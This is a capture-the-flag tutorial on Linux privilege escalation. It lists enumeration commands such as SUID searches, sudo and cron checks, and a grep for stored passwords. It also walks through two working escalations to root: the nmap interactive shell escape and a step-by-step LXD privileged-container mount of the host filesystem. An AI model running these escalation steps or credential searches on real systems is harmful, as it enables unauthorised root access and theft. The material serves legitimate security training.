# Privilege Escalation

Most capture the flag events involve scenarios where I have a foothold on a machine and now I need to become a user with more privileges so that I can get flags.

There are two main types of escalations, horizontal privilege escalation and vertical privilege escalation.

A typical example of of vertical privilege escalation is where I move from regular user on a Linux machine to root. In most capture the flag events this is the goal so that I can get the root flag.

A horizontal privilege escalation example is moving from one user to another that is not root. The new user will have their own groups, permissions and resources (folders and files) that the original user didn't have. Therefore, I now have more access to the machine but not root access.

## Linux Privilege Escalation

If I have a shell on a Linux machine, the goal is to become root. The process is part art and part science. Learning how Linux works and practicing can go a long way. Being creative is also very important. In my experience, enumeration is the most important skill with privilege escalation. For each user that I escalate to (whether vertically or horizontally), I run nearly identical steps. The things that each user has access to can be very unique.

This section will eventually become a whole page because of how much information it covers. New techniques are constantly being found, and researchers are finding new ways to exploit old systems and vulnerabilities. That is why this art and science intersect wonderfully here.

I eventually find a way to run the [LinPEAS](tools/linpeas.md) script somewhere on the machine. The insights that it provides are amazing! But I do not usually go straight to LinPEAS. I have a few commands that I run manually and check if they provide some quick wins. Here are the commands that I run and validate before I run LinPEAS:

### `ls /home`

I want to know what users are on the machine. If possible, I will go into each user's directory and see what files and folders are available. These include things like the following:

- The public and private keys in the .ssh folder.
- The .bash_history file.
- Documents and Desktop folders.
- Out-of-place folders like .git.

So if the user mike has a folder in /home, I would run the following command to explore what is available to me:

`ls -lha /home/mike`

### `cat /etc/passwd | grep '/bin/bash'`

If I can read the /etc/passwd file, it also has information about users of the system and where their home directory is located. Once in a while, the home directory of a user will not be in the /home folder. I am generally just looking for users that have a shell. The `grep '/bin/bash'` part of the command will filter out the users that do not have a shell.

### `find / -perm -u=s -type f 2>/dev/null`

The SUID (Set User ID) bit is a special permission that allows a user to run a binary with the privileges of the binary's owner, rather than their own user privileges. In other words, I can use a binary that root owns and run that binary as root instead of my regular user. An example of a binary that has the SUID bit set looks like the following:

`-rwsr-xr-x 1 root root 163K Apr   4  2025 /usr/bin/sudo`

Here is an explanation of the above command:

- The `-type f` option tells find to look for files.
- The `-perm -u=s` option tells find to look for files with the user SUID bit set.
- The `2>/dev/null` tells the command to redirect all errors to /dev/null (do not show errors).

I pair the output of this command with the [GTFOBins website](https://gtfobins.github.io/) to find out if any of the binaries with the SUID bit set can be used to escalate privileges.

#### SUID Example with GTFOBins

One capture the flag exercise had the SUID bit set for nmap. GTFOBins [has two examples with nmap](https://gtfobins.github.io/gtfobins/nmap/#suid) where you can get root. I like the second one if the version of nmap is between 2.02 and 5.21. All you have to type to get a root shell is the following:

```bash
sudo nmap --interactive
nmap> !sh
```

That will give you new shell as root. There are many examples of how you can exploit a binary with the SUID bit set. GTFOBins has a lot of good documentation around it.

### `crontab -e`

Capture the flag events often have a script that runs every minute that I can exploit to do privilege escalation. If my user has access, this will tell me what crons are running and how often. These jobs are for the current user. Here is a sample of a cron that runs each minute and runs a backup script in the user mike's home directory:

`* * * * * /usr/bin/python /home/mike/backup.py`

### `cat /etc/crontab`

Much like the previous command I seem to have better results when I run this command instead of the previous one. I find more crons with this command. They will follow the same format as the previous example.

### `id`

The `id` command is one of the very first things I run when I log in with a new user on a Linux machine. The group information that it provides lets me know what my attack surface is with this user. For example, sometimes in a capture the flag event, I will run the `id` command and see that a user is in the adm group. This means that this user can read a lot of log files in the /var/log directory. Log files are full of useful information.

I usually run the `id` command and then check what each group has access to. I note them and continue with other commands. The direction of this and other commands dictates where I should start attacking.

Here is some sample output for the `id` command:

`uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),132(postgres)`

In this case, I would note that the ubuntu user is also in the postgres group. I would make sure I understood what that means and then check the output from the next few sections of commands.

### `sudo -l`

If this command does not fail, it will tell me what scripts and binaries I can run as root. From here, I note what commands and binaries can be run. I also look at the binaries, scripts, and their containing directories. I am specifically looking at the permissions. Here are some examples of what I am looking for:

- Can I delete this binary and replace it with another one that does what I need it to do?
- Are there flags that I can run with this binary to do a wildcard attack?
- Can the binary run shell commands?
- Can I edit the script that is being run?
- What input does the script allow?

The answers to all these questions get noted.

If the output of this command produces `sudo NOPASSWD`, I will always check [GTFOBins](https://gtfobins.github.io/) for SUID and Sudo exploits. I will ask AI and Google to see if anyone has come up with a way to escalate with this command.

### `uname -a`

This command is very simple. There are kernel attacks that can be run to get root access. I will take the output of this command and check if there are any CVEs related to this kernel. Here is some sample output when I run the `uname -a` command:

`Linux my_machine 5.15.0-124-generic #134~20.04.1-Ubuntu SMP Tue Oct 1 15:27:33 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux`

I will type "Linux 5.15.0-124 CVE" into Google to see if there are any vulnerabilities.

### `env`

I know that this is a simple command but it can give a lot of information. This will show paths that binaries are located in. Often times the user I am using has read/write permissions for that directory. Some variables can be hits about what software is running on the machine. It doesn't hurt to have a peek and the rewards can be amazing.

### `groups` and `whoami /groups`

Both commands give information about what groups the user is apart of. The groups give clues about what a user has access to and where I need to look. For example, if I notice a use is a member of the adm group, I know that I can start to look at a lot of log files in /var/log since this group deals with system monitoring tasks.

### `grep -Ri "password" /home /opt 2>/dev/null`

Developers struggle to sanitize their logs before they write to file. So many capture the flag events have credentials in files. This command looks in two of the more common directories to contains passwords. It looks for the case-insensitive string "password". It will look in all files in the /home and /opt directories.

## Examples

### LXD (pronounced lex-dee)

LXD is used to manage virtual machines and system containers. It has very minimal overhead. I have used both Docker and Podman in the past and it works very similar to both.

I can create or download an image, start multiple containers from that single image and have them interact with each other.

The lxc command is used to start and stop containers. To use the lxd and lxc binaries my user was in the lxd group. The lxd group can also mount root filesystems, this will be important for the example below.

The example below will allow a user that is in the lxd group but not root to do a privilege escalation to root. The neat part is that the user will be root in the container and the host will map the actions of the root user in the container to the root user on the host.

Below is an example of how to download an alpine image from github and then run the container. Some of the file names may have changed but the concept should be the same.

Step 1 - Download the image from github.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
```

Step 2 - Import the image and alias it as alpine.

```bash
$ cd lxd-alpine-builder
$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

I normally check if it imported by running the following:

```bash
$ lxc image list
```

Step 3 - Create a container from the image named kwmd.

```bash
$ lxc init alpine kwmd -c security.privileged=true
```

The security.privileged=true configuration option maps the container uid 0 to the host's uid 0. In other words, the container's user is root and will run as root on the host machine.

Step 4 - Map the host hard drive to the container hard drive, I alias the drive as mydrive in this example.

```bash
$ lxc config device add kwmd mydrive disk source=/ path=/mnt/root recursive=true
```

This mounts the / directory on the host to the /mnt/root directory in the container. This combined with the security.privileged=true in step 3 is very dangerous.

Step 5 - Start the container.

```bash
$ lxc start kwmd
```

Step 6 - Enter the container with a shell.

```bash
$ lxc exec kwmd /bin/sh
```

The cursor will show up as a # character to let me know I am root.

I can now modify view or modify any file on the host directory. I just need to remember to prepend any directory with /mnt/root. Here are some examples:

- The /etc directory on the host would be /mnt/root/etc from the container.
- The /home directory on the host would be /mnt/root/home from the container.
- The /root directory on the host would be /mnt/root/root from the container.

Since I am root in the container and security.privileged=true was set, the host operating system maps any of my root container actions to the root user on the host machine.

